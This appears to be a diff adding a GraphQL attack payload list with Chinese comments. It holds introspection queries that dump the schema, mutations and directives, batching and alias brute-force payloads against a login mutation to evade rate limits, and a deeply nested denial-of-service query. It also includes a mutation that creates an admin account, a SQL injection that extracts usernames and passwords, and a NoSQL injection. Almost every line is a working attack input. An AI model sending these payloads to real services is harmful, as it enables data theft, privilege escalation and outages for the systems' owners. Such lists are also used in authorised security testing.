@@ -1,0 +1,24 @@
+# GraphQL - 内省查询 dump 数据库 Schema 泄露全部结构和字段
+{__schema{types{name,fields{name,type{name,kind}}}}}
+# GraphQL - 类型枚举查询 获取单个类型定义泄露敏感字段
+{__type(name:"User"){name,fields{name,type{name,kind,ofType{name,kind}}}}}
+# GraphQL - 内省查询 dump mutation 操作泄露数据修改入口
+{__schema{mutationType{name,fields{name,args{name,type{name,kind}}}}}}
+# GraphQL - Batching 攻击 批量并发认证爆破绕过速率限制
+[{"query":"mutation{login(username:\"admin\",password:\"admin123\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"password\"){token}}"},{"query":"mutation{login(username:\"admin\",password:\"123456\"){token}}"}]
+# GraphQL - 深度嵌套查询 DoS 攻击（资源耗尽拖垮服务）
+{user{posts{comments{author{posts{comments{author{posts{comments{content}}}}}}}}}}
+# GraphQL - 别名 Aliases 绕过速率限制并发暴力破解
+{m1:login(p:"1"){t} m2:login(p:"2"){t} m3:login(p:"3"){t} m4:login(p:"4"){t} m5:login(p:"5"){t}}
+# GraphQL - 内省查询 + dump 全部 Directive 定义泄露安全策略
+{__schema{directives{name,description,locations,args{name,description}}}}
+# GraphQL - 无内省但利用字段推荐机制枚举隐藏字段
+{__schema{types{name}}} {user(id:1){name,NOTEXIST}}
+# GraphQL - Mutation 注入创建管理员账户提权
+mutation{addUser(name:"hacker",email:"hacker@evil.com",role:"admin"){id,name,role}}
+# GraphQL - SQL 注入通过 GraphQL 参数传递恶意查询窃取数据库
+{user(id:"1' UNION SELECT username,password FROM users--"){name,email}}
+# GraphQL - NoSQL 注入通过 GraphQL 参数提取所有用户数据
+{user(id:"{\"$gt\":\"\"}"){name,email,password}}
+# GraphQL - 内省查询 dump subscription 操作泄露实时数据通道
+{__schema{subscriptionType{name,fields{name,type{name,kind,ofType{name,kind}}}}}}
